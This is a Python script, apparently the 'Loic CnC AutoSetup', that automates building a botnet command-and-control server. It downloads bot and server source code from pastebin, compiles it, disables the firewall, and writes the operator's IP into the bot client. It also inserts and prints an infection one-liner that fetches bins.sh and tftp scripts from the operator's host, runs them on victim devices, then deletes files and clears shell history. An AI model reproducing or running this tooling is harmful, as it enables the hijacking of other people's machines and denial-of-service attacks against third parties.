import subprocess

def cri(cmd):
    subprocess.call(cmd, shell=True)
def replace_line(file_name, line_num, text):
  lines = open(file_name, 'r').readlines()
  lines[line_num] = text
  out = open(file_name, 'w')
  out.writelines(lines)
  out.close()

print'\x1b[1;36m:::         ::::::::  :::::::::::  :::::::: '
print'\x1b[1;36m:+:        :+:    :+:     :+:     :+:    :+: '
print'\x1b[1;36m+:+        +:+    +:+     +:+     +:+        '
print'\x1b[1;36m+#+        +#+    +:+     +#+     +#+        '
print'\x1b[1;36m+#+        +#+    +#+     +#+     +#+        '
print'\x1b[1;36m#+#        #+#    #+#     #+#     #+#    #+# '
print'\x1b[1;36m##########  ########  ###########  ########  '
print'\x1b[1;37m\x1b[1;36mmLoic\x1b[1;37m] \x1b[1;37mCnC AutoSetup \nDeveloped By \x1b[0;31mFlexingOnLamers\x1b[1;37m/\x1b[0;31mCri '

ip = raw_input("\x1b[1;37mEnter Your Server IP:\x1b[1;35m")
user = raw_input("\x1b[1;37mEnter Desired Username:\x1b[1;35m")
passw = raw_input("\x1b[1;37mEnter Desired Password:\x1b[1;35m")
bport = raw_input("\x1b[1;37mEnter Desired BotPort:\x1b[0;31m")
port = raw_input("\x1b[1;37mEnter The Port You Want to screen on:\x1b[1;35m")

print '\x1b[1;35mInstalling Needed Dependencies..\x1b[1;37m'
cri('yum update -y')
cri('yum install python-paramiko gcc screen nano wget httpd iptables perl -y;')
cri('yum install gcc cmake gmp gmp-devel libpcap-devel gengetopt byacc flex -y')
cri('yum install json-c-doc.noarch json-c.i686 json-c.x86_64 json-c-devel.i686 json-c-devel.x86_64 -y')
cri('yum install epel-release -y')
cri('yum install gengetopt -y')
cri('wget -q https://pastebin.com/raw/YAXw7ZJq -O loic.c')
cri('gcc -o loic loic.c -pthread')
cri('rm -rf loic.c')
cri('wget -q https://pastebin.com/raw/idY5wpEu -O client.c')
cri('wget -q https://pastebin.com/raw/Ne69fRpz -O cc7.py')
cri('service iptabes stop')
cri('service httpd restart')
cri('systemctl stop firewalld')
cri('httpd -k restart')
cri('httpd -krestart')
cri('pkill screen')

replace_line('client.c', 859,  'unsigned char *AllDemDupes[] = { "'+ ip +':'+ bport +'" };\n')
replace_line('client.c', 861,  'char *infect = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://'+ ip +'/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp '+ ip +' -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g '+ ip +'; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh; rm -rf *;history -c\r\n";\n')
cri("echo "+ user +" "+ passw +" >> login.txt")
cri("python cc7.py client.c "+ ip + "")
cri("screen ./loic "+ bport +" 1 "+ port +"")
print '\x1b[1;37mWget/CHARLINE Below!'
print '\x1b[1;35mcd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://'+ ip +'/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp '+ ip +' -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g '+ ip +'; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh; rm -rf *'
print '\x1b[1;37mThank you for using the \x1b[1;37m[\x1b[0;31mLoic\x1b[1;37m] \x1b[1;37mCnC AutoSetup \n\x1b[0;31mPastebin\x1b[1;37m:\x1b[1;36mhttps://pastebin.com/u/flexingonlamers \n\x1b[0;31mGithub\x1b[1;37m:\x1b[1;36mhttps://github.com/AgentCri/  \n\x1b[0;31mEmail\x1b[1;37m:\x1b[1;36mcri@null.net \n\x1b[0;31mDiscord\x1b[1;37m:\x1b[1;36mCri#4614'